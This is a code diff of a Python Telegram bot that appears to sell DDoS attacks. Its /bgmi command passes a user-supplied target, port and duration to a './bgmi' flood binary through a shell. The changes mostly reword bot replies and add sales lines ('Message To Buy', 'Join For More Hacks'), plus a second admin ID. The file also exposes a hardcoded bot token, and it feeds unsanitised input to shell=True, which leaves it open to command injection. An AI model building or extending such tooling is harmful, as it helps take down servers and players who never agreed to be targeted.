@@ -11,7 +11,7 @@ import os
 bot = telebot.TeleBot('7284045723:AAE572P-NS8icyO_Vo30J3gIAHka1fweXOA')
 
 # Admin user IDs
-admin_id = ["6211690957"]
+admin_id = ["6211690957,1351184742"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -244,11 +244,11 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 500"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
+                response = f"**BGMI Attack Finished. Target: {target} Port: {port} Time: {time}**"
         else:
-            response = "Usage :- /bgmi <target> <port> <time>\n@RINOMODSOFFICIAL"  # Updated command syntax
+            response = "**Usage :- /bgmi <target> <port> <time>\n\nJoin For More Hacks - @RINOMODSOFFICIAL**"  # Updated command syntax
     else:
-        response = "You Are Not Authorized To Use This Command.\n@RINOMODSOFFICIAL"
+        response = "**You Are Not Authorised To Use This Bot\n\nMessage To Buy - @OFFICIALRINO**"
 
     bot.reply_to(message, response)
 
@@ -270,7 +270,7 @@ def show_command_logs(message):
         except FileNotFoundError:
             response = "No command logs found."
     else:
-        response = "You Are Not Authorized To Use This Command."
+        response = "**You Are Not Authorized To Use This Command**"
 
     bot.reply_to(message, response)
 
@@ -300,19 +300,19 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\n@RINOMODSOFFICIAL"
+    response = f"**Helo {user_name}\nPress To See Available Commands - /help\n\nJoin Our Channel - @RINOMODSOFFICIAL**"
     bot.reply_to(message, response)
 
 
 @bot.message_handler(commands=['rules'])
 def welcome_rules(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name} Please Follow These Rules:
+    response = f'''**{user_name} Please Follow These Rules:
 
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
 3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
-@RINOMODSOFFICIAL'''
+Join - @RINOMODSOFFICIAL**'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
@@ -344,7 +344,7 @@ def welcome_plan(message):
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
-@RINOMODSOFFICIAL
+Join - @RINOMODSOFFICIAL
 '''
     bot.reply_to(message, response)
 
